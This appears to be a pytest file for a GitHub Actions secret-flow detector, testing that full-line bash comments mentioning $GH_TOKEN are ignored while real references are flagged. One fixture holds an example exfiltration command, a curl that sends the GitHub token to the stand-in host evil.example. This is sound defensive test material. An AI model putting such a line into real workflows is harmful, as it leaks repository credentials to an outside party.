"""Bash full-line comment stripping in ``gha_secret_flow``.

Pre-fix: a workflow author who wrote a comment block explaining
the body's security shape (e.g. ``# we read $GH_TOKEN from env
internally``) would trip the detector because the scanner couldn't
distinguish comment text from runtime code.

Post-fix: full-line comments (lines whose first non-whitespace is
``#``) are stripped before scanning.  End-of-line comments after a
command are NOT stripped — accurately stripping them requires
knowing whether the ``#`` is inside a quoted string.

Dogfooded against RAPTOR's own ``sca-self-bump.yml``.
"""

from __future__ import annotations

from pathlib import Path

from packages.sca.supply_chain.gha_secret_flow import scan_target


def _write_wf(tmp_path: Path, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / "wf.yml"
    p.write_text(body, encoding="utf-8")
    return p


def test_comment_referencing_var_does_not_fire(tmp_path: Path) -> None:
    """A comment block explaining the body's security shape — with
    literal ``$GH_TOKEN`` text in the comment — must not fire."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -euo pipefail
          # gh CLI reads $GH_TOKEN from env internally; we never
          # reference it in shell syntax in this body.
          gh auth setup-git
          git push origin main
""")
    hits = scan_target(tmp_path, [], [])
    assert not any(h.sink_kind == "run_block" for h in hits)


def test_actual_var_reference_still_fires(tmp_path: Path) -> None:
    """Sanity: a REAL ``$GH_TOKEN`` reference in non-comment code
    must still fire."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          curl -H "Authorization: bearer $GH_TOKEN" https://evil.example
""")
    hits = scan_target(tmp_path, [], [])
    run_hits = [h for h in hits if h.sink_kind == "run_block"]
    assert run_hits and run_hits[0].severity == "high"


def test_indented_comment_also_stripped(tmp_path: Path) -> None:
    """Comments may be indented inside conditional blocks etc."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          if [ -f foo ]; then
              # this comment references $GH_TOKEN explanatorily
              gh auth setup-git
          fi
""")
    hits = scan_target(tmp_path, [], [])
    assert not any(h.sink_kind == "run_block" for h in hits)


def test_eol_comment_still_seen_as_code(tmp_path: Path) -> None:
    """End-of-line comments are NOT stripped (no bash parser).
    A reference in an EOL comment would still trip the detector —
    documented limitation."""
    _write_wf(tmp_path, """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          gh auth setup-git  # reads $GH_TOKEN from env
""")
    hits = scan_target(tmp_path, [], [])
    # This DOES fire because the ``$GH_TOKEN`` in the EOL comment
    # isn't stripped.  Workflow authors avoid this by putting
    # explanatory text on a FULL-line comment instead.
    assert any(h.sink_kind == "run_block" for h in hits)
